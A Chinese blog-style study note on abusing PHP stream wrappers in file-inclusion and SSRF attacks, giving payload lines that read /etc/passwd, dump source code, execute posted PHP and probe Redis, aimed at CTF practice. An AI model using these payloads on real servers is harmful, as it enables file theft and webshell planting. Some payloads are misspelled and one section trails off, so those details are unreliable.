---
title: php伪协议
categories: 网络
date: 2024-09-11 14:59:07
tags: php
crated: 2026-01-20T15:50
updated: 2026-01-20T15:39
---
# php伪协议

## 大类讲解
1. file:// 访问本地文件系统    
用来读取本地的文件，当用于文件读取函数时可以用。  
常见检测是否存在漏洞写法：  
www.xxx.com/?file=file:///etc/passwd  
此协议不受allow_url_fopen,allow_url_include配置影响  

2. php://input协议  
    使用方法：  
    在get处填上php://input如下  
    www.xxx.xxx/?cmd=php://input  
    然后用hackbar或者其他工具，postPHP代码进行检验，如  <?php>phpinfo()?>   
    此协议受allow_url_include配置影响  

3. php://filter协议  
此协议一般用来查看源码  
一般用法如下  
www.xxx.xxx/?file=php://filter/read=covert,vase64-encode/resource=index.php  
出来的是base64码需要进行解码  
此协议不受allow_url_fopen,allow_url_include配置影响

6. data:// 读取数据  
需要allow_url_fopen,allow_url_include均为on  
这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。常用代码如下：  
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>  
text/plain，表示的是文本  
text/plain;base64, 若纯文本没用可用base64编码

7. dict://
与gopher协议一般都出现在ssrf协议中，用来探测端口的指纹信息。同时也可以用它来代替gopher协议进行ssrf攻击。  
常见用法：  
    探测端口指纹  
    192.168.0.0/?url=dict://192.168.0.0:6379  
    以上为探测6379（redis）端口的开发  
    反弹shell

8. gopher://  
gopher://协议经常用来打内网的各种应用如mysql redis等。一般要用一些工具来进行构造payload 如gopherus等

9. zip://  
zip://协议可以用来访问服务器中的压缩包，无论压缩包里面的文件是什么类型的都可以执行。也就是说如果服务器禁止我们上传php文件那么我们可以把php文件改后缀然后压缩再上传，然后用zip协议访问。要利用zip协议时一般要结合文件上传与文件包含两个漏洞  
一般的代码为  
www.xxx.xxx/?file=zip:///php.zip#phpinfo.jpg  
其中的#好表示的是php.zip的子文件名。有时候#需要变成==%23==，url编码。

8. phar://  
phar://协议与zip://协议类似，它也可以访问zip包，访问的格式与zip的不同，如下所示

# 实际使用
## 文件包含函数
>文件包含所可能有的函数
php当中会造成文件包含漏洞的函数有：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file
实现方法
```php
1 ?file=data:text/plain,<?php phpinfo()?>  #GET数据
2 ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  #后面的base64字符是需要传入的字符串的base64编码
3 ?file=php://input [POST DATA:]<?php phpinfo()?>  #POST数据
4 ?file=php://filter/read=convert.base64-encode/resource=xxx.php  #get读源码
```
## php伪协议
>需要开启allow_url_fopen的：php://input、php://stdin、php://memory和php://temp  
不需要开启allow_wrl_fopen的：php://filter  
在CTF中经常使用的是php://filter和php://input  
php://filter用于读取源码，php://input用于执行php代码  
php://input需要post请求提交数据  
php://filter可以get提交?a=php://filter/read=convert.base64-encode/resource=xxx.php
## data伪协议
```php
?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码
?file=data:text/plain,<?php phpinfo()?> 
```
## file协议
>File:// 访问本地文件系统  
file:// 用于访问本地文件系统，如c:盘中的东西。在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。  
file:// [文件的绝对路径和文件名]  
linux 系统环境下：?file=file:///etc/passwd  
winows 系统环境下：?file=file:///E:\phpStudy\WWW\code\phpinfo.php

总结：File协议用于读取系统文件，c盘关键内容。Php://filter 用来读取文件内容，但是要base64后出来，否则会造成文件执行从而只看到执行结果。Php://input（代码执行）可将post请求中的数据作为PHP代码执行。可以用于写木马。Data和input相似，可以代码执行，但只有在php<5.3且include=on时可以写木马。
